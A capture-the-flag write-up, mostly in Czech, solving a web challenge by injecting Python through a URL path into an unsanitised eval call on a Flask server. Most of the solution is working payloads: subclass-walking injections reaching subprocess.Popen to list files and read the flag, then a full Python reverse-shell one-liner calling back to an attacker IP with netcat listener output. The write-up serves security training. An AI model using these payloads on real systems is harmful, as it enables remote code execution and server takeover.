# Streamlining portal (3)

## Zadání

Hi, packet inspector,

the AI is preparing some kind of employee streamlining portal on <http://user-info.mysterious-delivery.tcc>. We fear this will lead to more lost packages.

Your task is to break into the web and find interesting information on the server.

May the Packet be with you!

`Note: Solving this challenge will open 1 new challenge.`

## Nápovědy (Hints)

1\. Use VPN to get access to the web.

## Řešení

K řešení této úlohy je potřeba připojení pomocí VPN z úlohy [VPN access](../01_VPN_access/README.md)

Po otevření stránky z odkazu v zadání je adresa automaticky přesměrována na <http://user-info.mysterious-delivery.tcc/hello/user> a zároveň je na stránce zobrazeno `Hello user`. Pokud v URL změníme `user` na `CTF`, je zobrazeno `Hello CTF`. Cesta tedy povede nahrazením `user` za něco jiného.

Po zadání URL

`http://user-info.mysterious-delivery.tcc/hello/{'"/>`

ohlásí server chybu `Internal Server Error`. Problémovým znakem jsou uvozovky `"`.

Z HTTP hlavičky `Server: gunicorn` se dá zjistit, že se jedná o program v Pythonu napsaný zřejmě pomocí frameworku Flask.

Po chvilce zkoušení je zřejmé, že se jedná o chybu neošetřeného zpracování části URL.

`http://user-info.mysterious-delivery.tcc/hello/asd"+"qwe`

odpoví server `Hello asdqwe`.

Na adresu

`http://user-info.mysterious-delivery.tcc/hello/asd"+str(11+22)+"qwe`

odpoví server `Hello asd33qwe`.

---
Z výstupu

`http://user-info.mysterious-delivery.tcc/hello/asd"+str("".__class__)+"qwe>`

, který je `Hello asd<class 'str'>qwe` je zřejmé, že útok povede přes `Server Side Template Injection` nebo obdobnou cestu. Viz <https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/>.

PS: Nakonec se nejedná o útok SSTI, ale o neošetřené zpracování vstupu do funkce `eval`. Viz zdrojové soubory úlohy [app.tar.gz](app.tar.gz).

---
Nejprve zjistíme všechny třídy, které můžeme použít

`http://user-info.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__())+"`

Výstup si pomocí jednoduchého programu převedeme tak, abychom měli na každé řádce index a název třídy.

```python
data = "<class 'type'>, <class 'async....."
data = data.split(",")
cnt = 0
for item in data:
    print(cnt, item)
    cnt = cnt + 1
```

---
Zajímá nás index 279, který obsahuje třídu `subprocess.Popen`. Pomocí ní je možné vzdáleně volat na serveru programy. Vylistujeme si obsah aktuálního adresáře.

`http://user-info.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('ls -al',shell=True,stdout=-1).communicate())+"`

Výsledkem je po opravě odřádkování

```text
total 28
drw-r-xr-x 1 root root 4096 Sep  9 09:19 .
drwxr-xr-x 1 root root 4096 Sep  9 09:19 ..
drwxr-xr-x 1 root root 4096 Sep 27 10:46 FLAG
drw-rw-rw- 2 root root 4096 Sep  9 09:19 __pycache__
-rw-r-xr-x 1 root root  457 Sep  9 09:16 app.py
drwxr-xr-x 1 root root 4096 Sep  9 09:16 templates
```

---
Vylistujeme si adresář FLAG

`http://user-info.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('ls -al FLAG',shell=True,stdout=-1).communicate())+"`

```text
total 16
drwxr-xr-x 1 root root 4096 Sep 27 10:46 .
drw-r-xr-x 1 root root 4096 Sep  9 09:19 ..
-r--r--r-- 1 root root 26   Sep 27 10:46 flag.txt
```

---
Tady je už hledaný flag, který si stačí jen zobrazit

`http://user-info.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('cat FLAG/flag.txt',shell=True,stdout=-1).communicate())+"`

Po zadání flagu se odemkne další úloha [Streamlining portal NG](../14_Streamlining_portal_NG/README.md).

K řešení úloh tohoto typu je možné využít více postupů.

Jednodušší způsob, jak zobrazit flag

`http://user-info.mysterious-delivery.tcc/hello/"+open('FLAG/flag.txt').read()+"`

---
Díky připojení do VPN a tomu, že je IP adresa VPN připojení dostupná ze serveru, je možné zadáním vhodného payloadu spustit `Reverse shell`. Payloady je možné najít třeba zde <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md> nebo si ho nechat vygenerovat zde <https://www.revshells.com/>.

---
Zkusíme, jestli můžeme použít Python

`http://user-info.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('python --version',shell=True,stdout=-1).communicate())+"`

Odpověď `Hello (b'Python 3.10.6\n', None)`.

---
Pro IP adresu VPN připojení 10.20.0.10 pak stačí spustit poslouchání na portu 9001

`nc -lvnp 9001`

a zadat URL s payloadem pro Python

`http://user-info.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('python -c %5c"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%5c'10.200.0.10%5c',9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(%5c'bash%5c')"',shell=True))+"`

Pokud jsme vše správně nastavili, máme shell na cílový server a můžeme se volně procházet a spouštět příkazy

```shell
~ $ nc -lvnp 9001
Listening on [0.0.0.0] (family 2, port 9001)
Connection from 10.99.0.115 53226 received!
challengeuser@e6b83ccf7e8b:/app$ ls -al
ls -al
total 28
drw-r-xr-x 1 root root 4096 Sep  9 09:19 .
drwxr-xr-x 1 root root 4096 Sep  9 09:19 ..
drwxr-xr-x 1 root root 4096 Sep 27 10:46 FLAG
drw-rw-rw- 2 root root 4096 Sep  9 09:19 __pycache__
-rw-r-xr-x 1 root root  457 Sep  9 09:16 app.py
drwxr-xr-x 1 root root 4096 Sep  9 09:16 templates
challengeuser@e6b83ccf7e8b:/app$
```

Ze serveru je tak možné jednoduše cokoliv stahovat nebo tam nahrávat (ps, kill, atd.)

V souboru [app.tar.gz](app.tar.gz) jsou stažené zdrojové soubory serveru.

## Flag

`FLAG{OONU-Pm7V-BK3s-YftK}`
